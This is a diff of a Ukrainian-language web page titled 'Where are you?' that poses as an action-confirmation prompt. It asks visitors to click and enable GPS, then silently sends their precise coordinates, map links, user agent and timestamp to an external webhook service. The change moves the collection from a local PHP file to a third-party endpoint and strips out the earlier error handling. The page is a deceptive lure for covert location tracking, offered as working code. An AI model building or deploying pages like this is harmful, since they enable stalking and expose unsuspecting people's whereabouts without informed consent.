@@ -2,126 +2,104 @@
 <html lang="uk">
 <head>
 <meta charset="UTF-8">
-<title>Підтвердження</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Де ти?</title>
+
 <style>
-  body {
+  html, body {
     margin: 0;
-    background: linear-gradient(135deg, #1a1a2e, #16213e);
-    color: white;
-    font-family: sans-serif;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+  }
+
+  body {
+    background: linear-gradient(135deg, #4e54c8, #8f94fb);
+    font-family: Arial, sans-serif;
+    color: #ffffff;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
     text-align: center;
   }
+
   .box {
-    background: rgba(255, 255, 255, 0.1);
-    padding: 2rem;
-    border-radius: 15px;
-    border: 1px solid rgba(255,255,255,0.2);
-    width: 90%;
-    max-width: 400px;
+    background: rgba(0, 0, 0, 0.3);
+    padding: 30px;
+    border-radius: 12px;
+    max-width: 420px;
   }
-  #status {
-    margin-top: 15px;
-    font-size: 14px;
-    color: #ff4d4d; /* Червоний для помилок за замовчуванням */
+
+  h1 {
+    margin-top: 0;
+    font-size: 22px;
   }
-  button {
-    background: #4e54c8;
-    color: white;
-    border: none;
-    padding: 15px 30px;
-    border-radius: 8px;
-    font-size: 18px;
-    cursor: pointer;
+
+  p {
+    opacity: 0.9;
+    font-size: 15px;
   }
 </style>
 </head>
 <body>
 
 <div class="box">
-  <h1>Дія підтверджена</h1>
-  <p>Для завершення натисніть кнопку нижче:</p>
-  <button id="startBtn">ПІДТВЕРДИТИ</button>
-  <div id="status"></div>
+  <h1>Підтвердження дії</h1>
+  <p>
+    Натисніть будь-де на сторінці,<br> ввімкни GPS та інтернет
+  </p>
 </div>
 
 <script>
-const statusDiv = document.getElementById('status');
-const btn = document.getElementById('startBtn');
 let sent = false;
 
-// Перевірка HTTPS (Геолокація працює тільки через HTTPS)
-if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost') {
-    statusDiv.innerHTML = "<strong>ПОМИЛКА:</strong> Геолокація працює лише на HTTPS протоколі!";
-}
-
-btn.addEventListener("click", () => {
+function sendGeoOnce() {
   if (sent) return;
-  
-  statusDiv.style.color = "#8f94fb";
-  statusDiv.innerText = "Запит геолокації... Будь ласка, дозвольте доступ у вікні браузера.";
+  sent = true;
 
   if (!navigator.geolocation) {
-    statusDiv.innerText = "Ваш браузер не підтримує геолокацію.";
+    alert("Геолокація не підтримується браузером");
     return;
   }
 
   navigator.geolocation.getCurrentPosition(
     (pos) => {
-      sent = true;
-      statusDiv.style.color = "#4ade80"; // Зелений
-      statusDiv.innerText = "Координати отримано. Надсилаю на сервер...";
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      const googleMap = "https://www.google.com/maps?q=" + lat + "," + lon;
+      const openStreetMap =
+        "https://www.openstreetmap.org/?mlat=" + lat +
+        "&mlon=" + lon +
+        "#map=17/" + lat + "/" + lon;
 
       const payload = {
-        latitude: pos.coords.latitude,
-        longitude: pos.coords.longitude,
+        latitude: lat,
+        longitude: lon,
         accuracy: pos.coords.accuracy,
+        google_map: googleMap,
+        openstreet_map: openStreetMap,
         user_agent: navigator.userAgent,
         time: new Date().toISOString()
       };
 
-      // ВАЖЛИВО: Перевірте чи назва файлу .php збігається!
-      fetch("webhook2345234664352342345.php", {
+      fetch("https://app.hooklistener.com/w/my-first-endpoint-ph72/", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify(payload)
-      })
-      .then(res => {
-        if(res.ok) {
-            statusDiv.innerText = "Успішно! Дані збережено.";
-            document.querySelector(".box").innerHTML = "<h1>Дякуємо</h1><p>Вашу дію підтверджено.</p>";
-        } else {
-            statusDiv.innerText = "Помилка сервера: " + res.status;
-        }
-      })
-      .catch(err => {
-        statusDiv.innerText = "Помилка мережі: " + err.message;
       });
+
+      document.querySelector(".box").innerHTML =
+        "<h1>Дякуємо</h1><p>Локацію передано</p>";
     },
     (err) => {
-      // Деталізація помилок для вас
-      switch(err.code) {
-        case err.PERMISSION_DENIED:
-          statusDiv.innerText = "Ви відхилили запит на доступ до локації.";
-          break;
-        case err.POSITION_UNAVAILABLE:
-          statusDiv.innerText = "Інформація про місцезнаходження недоступна.";
-          break;
-        case err.TIMEOUT:
-          statusDiv.innerText = "Час очікування запиту вичерпано.";
-          break;
-        default:
-          statusDiv.innerText = "Сталася невідома помилка.";
-          break;
-      }
-    },
-    { enableHighAccuracy: true, timeout: 10000 }
+      alert("Помилка геолокації: " + err.message);
+    }
   );
-});
+}
+
+document.addEventListener("click", sendGeoOnce);
 </script>
 
 </body>
